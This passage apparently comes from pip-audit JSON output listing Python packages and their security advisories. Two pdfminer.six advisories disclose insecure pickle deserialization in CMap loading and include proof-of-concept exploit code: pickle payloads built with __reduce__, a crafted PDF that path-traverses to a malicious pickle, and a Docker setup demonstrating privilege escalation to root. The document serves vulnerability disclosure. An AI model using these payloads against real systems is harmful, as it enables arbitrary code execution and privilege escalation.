demo_cmap_data = EvilPayload()      # Create the pickle file that the path traversal would access     target_path = \"./malicious.pickle.gz\"      try:         with gzip.open(target_path, 'wb') as f:             pickle.dump(demo_cmap_data, f)         print(f\"\u2713 Created demonstration pickle file: {target_path}\")         return target_path      except Exception as e:         print(f\"\u2717 Error creating pickle file: {e}\")         return None  if __name__ == \"__main__\":     create_demo_pickle() ```  This will create a harmless, zipped pickle file that will display \"Malicious code eecuted.\" then exit when deserialized. Put the file in `/pdfs/malicious.pickle.gz`.  #### Test  Install pdfminer.six and run `pdf2text.py /pdfs/malicious.pdf`. Instead of processing the PDF as normal you should see the output:  ``` $ pdf2txt.py malicious.pdf Malicious code executed! ```  ### Impact  If pdfminer.six processes a malicious PDF which points to a zipped pickle file under the control of an attacker the result is arbitrary code execution on the victim's system. An attacker could execute the Python code of their chosing with the permissions of the process running pdfminer.six.  The difficulty in achieving this depends on the OS, see below.  #### Linux, MacOS - harder to exploit  On Linux-like systems only files on the filesystem can be resolved. An attacker would need to provide the malicious PDF for processing *and* the malicious pickle file would need to be present on the target system in a location that the attacker already knows, since it needs to be set in the PDF itself. In many cases this will be difficult to exploit because even if the attacker provides both the PDF and the pickle file together, there would be no way to know in advance which full path to the pickle file to specify. In many cases this would make exploitation difficult or impossible. However:  * An attacker may find a way to write files to a known location on the target system or * The system in question may, by design, read files from a known location such as a network share designated for PDF ingestion.  Overall, there is generally less risk on a Linux or Linux-like system.  #### Windows - easier to exploit  Windows paths can specify network locations e.g. WebDAV, SMB. This means that an attacker could host the malicious pickle remotely and specify a path to the it in the PDF. Since there is no need to get the malicious pickle file on to the target system, exploitation is easier on a Windows OS.  ### Appendix  A complete, malicious PDF is provided here. A dockerized POC is available upon request.  ``` %PDF-1.4 1 0 obj << /Type /Catalog /Pages 2 0 R >> endobj  2 0 obj << /Type /Pages /Kids [3 0 R] /Count 1 >> endobj  3 0 obj << /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >> endobj  4 0 obj << /Length 44 >> stream BT /F1 12 Tf 100 700 Td (Malicious PDF) Tj ET endstream endobj  5 0 obj << /Type /Font /Subtype /Type0 /BaseFont /MaliciousFont-Identity-H /Encoding /#2Fpdfs#2Fmalicious /DescendantFonts [6 0 R] >> endobj  6 0 obj << /Type /Font /Subtype /CIDFontType2 /BaseFont /MaliciousFont /CIDSystemInfo << /Registry (Adobe) /Ordering (Identity) /Supplement 0 >> /FontDescriptor 7 0 R >> endobj  7 0 obj << /Type /FontDescriptor /FontName /MaliciousFont /Flags 4 /FontBBox [-1000 -1000 1000 1000] /ItalicAngle 0 /Ascent 1000 /Descent -200 /CapHeight 800 /StemV 80 >> endobj  xref 0 8 0000000000 65535 f 0000000009 00000 n 0000000058 00000 n 0000000115 00000 n 0000000274 00000 n 0000000370 00000 n 0000000503 00000 n 0000000673 00000 n trailer << /Size 8 /Root 1 0 R >> startxref 871 %%EOF ```"}, {"id": "GHSA-f83h-ghpp-7wcc", "fix_versions": [], "aliases": [], "description": "### \ud83d\ude80 Overview  This report **demonstrates a real-world privilege escalation** vulnerability in [pdfminer.six](https://github.com/pdfminer/pdfminer.six) due to unsafe usage of Python's `pickle` module for CMap file loading. It shows how a low-privileged user can gain root access (or escalate to any service account) by exploiting insecure deserialization in a typical multi-user or server environment.  ![line](https://user-images.githubusercontent.com/74038190/212284100-561aa473-3905-4a80-b561-0d28506553ee.gif)  ## \ud83d\udea8 Special Note  This advisory addresses a distinct vulnerability from [GHSA-wf5f-4jwr-ppcp (CVE-2025-64512)](https://github.com/pdfminer/pdfminer.six/security/advisories/GHSA-wf5f-4jwr-ppcp).  While the previous CVE claims to mitigate issues related to unsafe deserialization, the patch introduced in commit [b808ee05dd7f0c8ea8ec34bdf394d40e63501086](https://github.com/pdfminer/pdfminer.six/commit/b808ee05dd7f0c8ea8ec34bdf394d40e63501086) does not address the vulnerability reported here.  Based on testing performed against the latest version of the library ([comparison view](https://github.com/pdfminer/pdfminer.six/compare/20250506...20251107)), the issue remains exploitable through local privilege escalation due to continued unsafe use of pickle files. The **Dockerfile** is hence modified to run test against this claim.  This demonstrates that the patch for **CVE-2025-64512** is incomplete: the vulnerability remains exploitable. This advisory therefore documents a distinct, independently fixable flaw. A correct remediation must remove the dependency on pickle files (or otherwise eliminate unsafe deserialization) and replace it with a safe, auditable data-handling approach so the library can operate normally without relying on ```pickle```  ## \ud83d\udcda Table of Contents  - [\ud83d\udd0d Background](#-background) - [\ud83d\udc0d Vulnerability Description](#-vulnerability-description) - [\ud83c\udfad Demo Scenario](#-demo-scenario) - [\ud83e\udde8 Technical Details](#-technical-details) - [\ud83d\udd27 Setup and Usage](#-setup-and-usage) - [\ud83d\udcdd Step-by-step Walkthrough](#-step-by-step-walkthrough) - [\ud83d\udee1\ufe0f Security Standards & References](#-security-standards--references) ---  ## \ud83d\udd0d Background  **pdfminer.six** is a popular Python library for extracting text and information from PDF files. It supports CJK (Chinese, Japanese, Korean) fonts via external CMap files, which it loads from disk using Python's `pickle` module.  > \ud83d\udc0d **Security Issue:** > If the CMap search path (`CMAP_PATH` or default directories) includes a world-writable or user-writable directory, an attacker can place a malicious `.pickle.gz` file that will be loaded and deserialized by pdfminer.six, leading to arbitrary code execution.  ---  ### \ud83d\udc0d Vulnerability Description  - **Component:** pdfminer.six CMap loading (`pdfminer/cmapdb.py`) - **Issue:** Loads and deserializes `.pickle.gz` files using Python\u2019s `pickle` module, which is unsafe for untrusted data. - **Exploitability:** If a low-privileged user can write to any directory in `CMAP_PATH`, they can execute code as the user running pdfminer\u2014potentially root or a privileged service. - **Impact:** Full code execution as the service user, privilege escalation from user to root, persistence, and potential lateral movement.  ![line](https://user-images.githubusercontent.com/74038190/212284100-561aa473-3905-4a80-b561-0d28506553ee.gif) ### \ud83c\udfad Demo Scenario  **Environment:** - \ud83d\udc27 Alpine Linux (Docker container) - \ud83d\udc68\u200d\ud83d\udcbb Two users:   - `user1` (attacker: low-privilege)   - `root` (victim: runs privileged PDF-processing script) - \ud83d\uddc2\ufe0f Shared writable directory: `/tmp/uploads` - \ud83d\udee3\ufe0f `CMAP_PATH` set to `/tmp/uploads` for the privileged script - \ud83d\udce6 pdfminer.six installed system-wide  **Attack Flow:** 1. \ud83d\udd75\ufe0f\u200d\u2642\ufe0f `user1` creates a malicious CMap file (`Evil.pickle.gz`) in `/tmp/uploads`. 2. \ud83d\udc51 The privileged service (`root`) processes a PDF or calls `get_cmap(\"Evil\")`. 3. \ud83d\udca3 The malicious pickle is deserialized, running arbitrary code as root. 4. \ud83c\udfaf The exploit creates a flag file in `/root/pwnedByPdfminer` as proof.  ![line](https://user-images.githubusercontent.com/74038190/212284100-561aa473-3905-4a80-b561-0d28506553ee.gif)  ### \ud83e\udde8 Technical Details  - **Vulnerability Type:** Insecure deserialization of untrusted data using Python's `pickle` - **Attack Prerequisites:** Attacker can write to a directory included in `CMAP_PATH` - **Vulnerable Line:**   ```python   return type(str(name), (), pickle.loads(gzfile.read()))   ```   *In `pdfminer/cmapdb.py`'s `_load_data` method* - https://github.com/pdfminer/pdfminer.six/blob/20250506/pdfminer/cmapdb.py#L246 - **Proof of Concept:** See `createEvilPickle.py`, `evilmod.py`, and `processPdf.py`  **Exploit Chain:** - Attacker places a malicious `.pickle.gz` file in the CMap search path. - Privileged process (e.g., root) loads a CMap, triggering pickle deserialization. - Arbitrary code executes with the privilege of the process (root/service account).  ![line](https://user-images.githubusercontent.com/74038190/212284100-561aa473-3905-4a80-b561-0d28506553ee.gif)  ## \ud83d\udd27 Setup and Usage  ### \ud83d\udcc1 Files #### </> Dockerfile ```yml FROM python:3.11-alpine  ARG PM_COMMIT=b808ee05dd7f0c8ea8ec34bdf394d40e63501086  # Install git and build tooling RUN apk add --no-cache git build-base  WORKDIR /opt  # Clone pdfminer.six and check out the specific commit, then install from source RUN git clone https://github.com/pdfminer/pdfminer.six.git && \\     cd pdfminer.six && \\     git fetch --all && \\     git checkout ${PM_COMMIT} && \\     pip install --no-cache-dir -e .  # App working directory for PoC WORKDIR /app  # Create low-privilege user and uploads dir RUN adduser -D user1 && \\     mkdir -p /tmp/uploads && \\     chown user1:user1 /tmp/uploads && \\     chmod 1777 /tmp/uploads  # Copy PoC files COPY evilmod.py /app/evilmod.py COPY createEvilPickle.py /app/createEvilPickle.py COPY processPDF.py /app/processPDF.py  ENV CMAP_PATH=/tmp/uploads ENV PYTHONUNBUFFERED=1  # Keep the container running in background so you can exec into it anytime. CMD [\"tail\", \"-f\", \"/dev/null\"]  ```  #### </> evilmod.py ```python import os  def evilFunc():     with open(\"/root/pwnedByPdfminer\", \"w\") as f:         f.write(\"ROOTED by pdfminer pickle RCE\\n\")     return {\"CODE2CID\": {}, \"IS_VERTICAL\": False} ``` #### </> createEvilPickle.py ```python import pickle import gzip from evilmod import evilFunc  class Evil:     def __reduce__(self):         return (evilFunc, ())  payload = pickle.dumps(Evil()) with gzip.open(\"/tmp/uploads/Evil.pickle.gz\", \"wb\") as f:     f.write(payload)  print(\"Malicious pickle created at /tmp/uploads/Evil.pickle.gz\") ``` #### </> processPDF.py ```python import os from pdfminer.cmapdb import CMapDB  os.environ[\"CMAP_PATH\"] = \"/tmp/uploads\"  CMapDB.get_cmap(\"Evil\")  print(\"CMap loaded. If vulnerable, /root/pwnedByPdfminer will be created.\") ``` ![line](https://user-images.githubusercontent.com/74038190/212284100-561aa473-3905-4a80-b561-0d28506553ee.gif)  ### 1\ufe0f\u20e3 Build and start the demo container  ```bash docker build -t pdfminer-priv-esc-demo . docker run --rm -it --name pdfminer-demo pdfminer-priv-esc-democ ```  ### 2\ufe0f\u20e3 In the container, open two shells in parallel (or switch users in one):  #### \ud83d\udd75\ufe0f\u200d\u2642\ufe0f Shell 1 (Attacker: user1) ```bash su user1 cd /app python createEvilPickle.py # \u2705 Confirms: /tmp/uploads/Evil.pickle.gz is created and owned by user1 ```  #### \ud83d\udc51 Shell 2 (Victim: root) ```bash cd /app python processPdf.py # \ud83c\udfaf Output: If vulnerable, /root/pwnedByPdfminer will be created ```  ### 3\ufe0f\u20e3 Proof of escalation  ```bash cat /root/pwnedByPdfminer # \ud83c\udff4 Output: ROOTED by pdfminer pickle RCE ```  <img width=\"815\" height=\"889\" alt=\"proof-of-exploit\" src=\"https://github.com/user-attachments/assets/f465d17c-a3af-49c5-9dbc-eec9635b36fc\" />  ![line](https://user-images.githubusercontent.com/74038190/212284100-561aa473-3905-4a80-b561-0d28506553ee.gif)  ## \ud83d\udcdd Step-by-step Walkthrough  1. **user1** uses `createEvilPickle.py` to craft and place a malicious CMap pickle in a shared upload directory. 2. The **root** user runs a typical PDF-processing script, which loads CMap files from that directory. 3. The exploit triggers, running arbitrary code as root. 4. The attacker now has proof of code execution as root (and, in a real attack, could escalate further).  ![line](https://user-images.githubusercontent.com/74038190/212284100-561aa473-3905-4a80-b561-0d28506553ee.gif)  ## \ud83d\udee1\ufe0f Security Standards & References  - **CVSS (Common Vulnerability Scoring System):**   - **Base Score:** 7.8 (High)   - **Vector:** `AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`  - **OWASP Top 10:**   - [A08:2021 - Software and Data Integrity Failures](https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/)   - [A03:2021 - Injection](https://owasp.org/Top10/A03_2021-Injection/) (by analogy, as it's code injection via deserialization)  - **MITRE CWE References:**   - [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)   - [CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes](https://cwe.mitre.org/data/definitions/915.html)  - **MITRE ATT&CK Techniques:**   - [T1055: Process Injection](https://attack.mitre.org/techniques/T1055/)   - [T1548: Abuse Elevation Control Mechanism](https://attack.mitre.org/techniques/T1548/)"}]}, {"name": "pdfplumber", "version": "0.11.7", "vulns": []}, {"name": "pefile", "version": "2023.2.7", "vulns": []}, {"name": "pillow", "version": "12.0.0", "vulns": []}, {"name": "pip", "version": "25.3", "vulns": []}, {"name": "pip-api", "version": "0.0.34", "vulns": []}, {"name": "pip-audit", "version": "2.9.0", "vulns": []}, {"name": "pip-requirements-parser", "version": "32.0.1", "vulns": []}, {"name": "pip-tools", "version": "7.5.1", "vulns": []}, {"name": "platformdirs", "version": "4.5.0", "vulns": []}, {"name": "pluggy", "version": "1.6.0", "vulns": []}, {"name": "pre-commit", "version": "4.3.0", "vulns": []}, {"name": "propcache", "version": "0.3.2", "vulns": []}, {"name": "protobuf", "version": "6.32.1", "vulns": []}, {"name": "prov", "version": "2.1.1", "vulns": []}, {"name": "psutil", "version": "7.1.1", "vulns": []}, {"name": "puremagic", "version": "1.30", "vulns": []}, {"name": "py-cpuinfo", "version": "9.0.0", "vulns": []}, {"name": "py-serializable", "version": "2.1.0", "vulns": []}, {"name": "pyasn1", "version": "0.6.1", "vulns": []}, {"name": "pycparser", "version": "2.23", "vulns": []}, {"name": "pydantic", "version": "2.12.3", "vulns": []}, {"name": "pydantic-core", "version": "2.41.4", "vulns": []}, {"name": "pydantic-settings", "version": "2.11.0", "vulns": []}, {"name": "pydot", "version": "4.0.1", "vulns": []}, {"name": "pygments", "version": "2.19.2", "vulns": []}, {"name": "pyinstaller", "version": "6.16.0", "vulns": []}, {"name": "pyinstaller-hooks-contrib", "version": "2025.8", "vulns": []}, {"name": "pyjwt", "version": "2.9.0", "vulns": []}, {"name": "pymupdf", "version": "1.26.4", "vulns": []}, {"name": "pypandoc", "version": "1.15", "vulns": []}, {"name": "pyparsing", "version": "3.2.5", "vulns": []}, {"name": "pypdfium2", "version": "4.30.0", "vulns": []}, {"name": "pyproject-hooks", "version": "1.2.0", "vulns": []}, {"name": "pyqt6", "version": "6.9.1", "vulns": []}, {"name": "pyqt6-qt6", "version": "6.9.2", "vulns": []}, {"name": "pyqt6-sip", "version": "13.10.2", "vulns": []}, {"name": "pyside6", "version": "6.9.2", "vulns": []}, {"name": "pyside6-addons", "version": "6.9.2", "vulns": []}, {"name": "pyside6-essentials", "version": "6.9.2", "vulns": []}, {"name": "pytest", "version": "9.0.1", "vulns": []}, {"name": "pytest-cov", "version": "7.0.0", "vulns": []}, {"name": "python-dateutil", "version": "2.9.0.post0", "vulns": []}, {"name": "python-docx", "version": "1.2.0", "vulns": []}, {"name": "python-dotenv", "version": "1.2.1", "vulns": []}, {"name": "python-jose", "version": "3.3.0", "vulns": [{"id": "PYSEC-2024-232", "fix_versions": ["3.4.0"], "aliases": ["CVE-2024-33663"], "description": "python-jose through 3.3.0 has algorithm confusion with OpenSSH ECDSA keys and other key formats. This is similar to CVE-2022-29217."}, {"id": "PYSEC-2024-233", "fix_versions": ["3.4.0"], "aliases": ["CVE-2024-33664"], "description": "python-jose through 3.3.0 allows attackers to cause a denial of service (resource consumption) during a decode via a crafted JSON Web Encryption (JWE) token with a high compression ratio, aka a \"JWT bomb.\" This is similar to CVE-2024-21319."}]}, {"name": "python-multipart", "version": "0.0.20", "vulns": []}, {"name": "python-pptx", "version": "1.0.2", "vulns": []}, {"name": "pytz", "version": "2025.2", "vulns": []}, {"name": "pywin32", "version": "311", "vulns": []}, {"name": "pywin32-ctypes", "version": "0.2.3", "vulns": []}, {"name": "pyxnat", "version": "1.6.3", "vulns": []}, {"name": "pyyaml", "version": "6.0.3", "vulns": []}, {"name": "rdflib", "version": "7.2.1", "vulns": []}, {"name": "referencing", "version": "0.37.0", "vulns": []}, {"name": "regex", "version": "2025.9.18", "vulns": []}, {"name": "reportlab", "version": "4.4.4", "vulns": []}, {"name": "requests", "version": "2.32.5", "vulns": []}, {"name": "requests-toolbelt", "version": "1.0.0", "vulns": []}, {"name": "rich", "version": "14.2.0", "vulns": []}, {"name": "rpds-py", "version": "0.28.0", "vulns": []}, {"name": "rsa", "version": "4.9.1", "vulns": []}, {"name": "ruff", "version": "0.14.3", "vulns": []}, {"name": "safetensors", "version": "0.6.2", "vulns": []}, {"name": "scikit-learn", "version": "1.7.2", "vulns": []}, {"name": "scipy", "version": "1.16.2", "vulns": []}, {"name": "sentence-transformers", "version": "5.1.1", "vulns": []}, {"name": "setuptools", "version": "80.9.0", "vulns": []}, {"name": "shellingham", "version": "1.5.4", "vulns": []}, {"name": "shiboken6", "version": "6.9.2", "vulns": []}, {"name": "simplejson", "version": "3.20.2", "vulns": []}, {"name": "six", "version": "1.17.0", "vulns": []}, {"name": "slowapi", "version": "0.1.9", "vulns": []}, {"name": "sniffio", "version": "1.3.1", "vulns": []}, {"name": "sortedcontainers", "version": "2.4.0", "vulns": []}, {"name": "soupsieve", "version": "2.8", "vulns": []}, {"name": "sqlalchemy", "version": "2.0.44", "vulns": []}, {"name": "sqlalchemy2-stubs", "version": "0.0.2a38", "vulns": []}, {"name": "starlette", "version": "0.49.1", "vulns": []}, {"name": "sympy", "version": "1.14.0", "vulns": []}, {"name": "tenacity", "version": "9.1.2", "vulns": []}, {"name": "tensorboard", "version": "2.20.0", "vulns": []}, {"name": "tensorboard-data-server", "version": "0.7.2", "vulns": []}, {"name": "tensorflow", "version": "2.20.0", "vulns": []}, {"name": "termcolor", "version": "3.1.0", "vulns": []}, {"name": "threadpoolctl", "version": "3.6.0", "vulns": []}, {"name": "tiktoken", "version": "0.11.0", "vulns": []}, {"name": "tinycss2", "version": "1.4.0", "vulns": []}, {"name": "tokenizers", "version": "0.22.1", "vulns": []}, {"name": "toml", "version": "0.10.2", "vulns": []}, {"name": "torch", "version": "2.8.0", "vulns": []}, {"name": "tqdm", "version": "4.67.1", "vulns": []}, {"name": "traits", "version": "7.0.2", "vulns": []}, {"name": "transformers", "version": "4.56.2", "vulns": []}, {"name": "typer", "version": "0.20.0", "vulns": []}, {"name": "types-openpyxl", "version": "3.0.0", "vulns": []}, {"name": "types-passlib", "version": "1.7.0", "vulns": []}, {"name": "types-psutil", "version": "5.9.1", "vulns": []}, {"name": "types-reportlab", "version": "4.4.4.20250926", "vulns": []}, {"name": "types-requests", "version": "2.31.0.0", "vulns": []}, {"name": "types-urllib3", "version": "1.26.25.14", "vulns": []}, {"name": "typing-extensions", "version": "4.15.0", "vulns": []}, {"name": "typing-inspect", "version": "0.9.0", "vulns": []}, {"name": "typing-inspection", "version": "0.4.2", "vulns": []}, {"name": "tzdata", "version": "2025.2", "vulns": []}, {"name": "urllib3", "version": "2.5.0", "vulns": [{"id": "GHSA-gm62-xv2j-4w53", "fix_versions": ["2.6.0"], "aliases": ["CVE-2025-66418"], "description": "## Impact  urllib3 supports chained HTTP encoding algorithms for response content according to RFC 9110 (e.g., `Content-Encoding: gzip, zstd`).  However, the number of links in the decompression chain was unbounded allowing a malicious server to insert a virtually unlimited number of compression steps leading to high CPU usage and massive memory allocation for the decompressed data.   ## Affected usages  Applications and libraries using urllib3 version 2.5.0 and earlier for HTTP requests to untrusted sources unless they disable content decoding explicitly.   ## Remediation  Upgrade to at least urllib3 v2.6.0 in which the library limits the number of links to 5.  If upgrading is not immediately possible, use [`preload_content=False`](https://urllib3.readthedocs.io/en/2.5.0/advanced-usage.html#streaming-and-i-o) and ensure that `resp.headers[\"content-encoding\"]` contains a safe number of encodings before reading the response content."}, {"id": "GHSA-2xpw-w6gg-jr37", "fix_versions": ["2.6.0"], "aliases": ["CVE-2025-66471"], "description": "### Impact  urllib3's [streaming API](https://urllib3.readthedocs.io/en/2.5.0/advanced-usage.html#streaming-and-i-o) is designed for the efficient handling of large HTTP responses by reading the content in chunks, rather than loading the entire response body into memory at once.  When streaming a compressed response, urllib3 can perform decoding or decompression based on the HTTP `Content-Encoding` header (e.g., `gzip`, `deflate`, `br`, or `zstd`). The library must read compressed data from the network and decompress it until the requested chunk size is met. Any resulting decompressed data that exceeds the requested amount is held in an internal buffer for the next read operation.  The decompression logic could cause urllib3 to fully decode a small amount of highly compressed data in a single operation. This can result in excessive resource consumption (high CPU usage and massive memory allocation for the decompressed data; CWE-409) on the client side, even if the application only requested a small chunk of data.   ### Affected usages  Applications and libraries using urllib3 version 2.5.0 and earlier to stream large compressed responses or content from untrusted sources.  `stream()`, `read(amt=256)`, `read1(amt=256)`, `read_chunked(amt=256)`, `readinto(b)` are examples of `urllib3.HTTPResponse` method calls using the affected logic unless decoding is disabled explicitly.   ### Remediation  Upgrade to at least urllib3 v2.6.0 in which the library avoids decompressing data that exceeds the requested amount.  If your environment contains a package facilitating the Brotli encoding, upgrade to at least Brotli 1.2.0 or brotlicffi 1.2.0.0 too. These versions are enforced by the `urllib3[brotli]` extra in the patched versions of urllib3.   ### Credits  The issue was reported by @Cycloctane. Supplemental information was provided by @stamparm during a security audit performed by [7ASecurity](https://7asecurity.com/) and facilitated by [OSTIF](https://ostif.org/)."}]}, {"name": "uvicorn", "version": "0.38.0", "vulns": []}, {"name": "virtualenv", "version": "20.35.4", "vulns": []}, {"name": "watchfiles", "version": "1.1.1", "vulns": []}, {"name": "webencodings", "version": "0.5.1", "vulns": []}, {"name": "websockets", "version": "15.0.1", "vulns": []}, {"name": "werkzeug", "version": "3.1.3", "vulns": [{"id": "GHSA-hgf8-39gv-g3f2", "fix_versions": ["3.1.4"], "aliases": ["CVE-2025-66221"], "description": "Werkzeug's `safe_join` function allows path segments with Windows device names. On Windows, there are special device names such as `CON`, `AUX`, etc that are implicitly present and readable in every directory. `send_from_directory` uses `safe_join` to safely serve files at user-specified paths under a directory. If the application is running on Windows, and the requested path ends with a special device name, the file will be opened successfully, but reading will hang indefinitely."}]}, {"name": "wheel", "version": "0.45.1", "vulns": []}, {"name": "wrapt", "version": "2.0.0", "vulns": []}, {"name": "xlsxwriter", "version": "3.2.9", "vulns": []}, {"name": "yarl", "version": "1.20.1", "vulns": []}, {"name": "zstandard", "version": "0.25.0", "vulns": []}], "fixes": []}
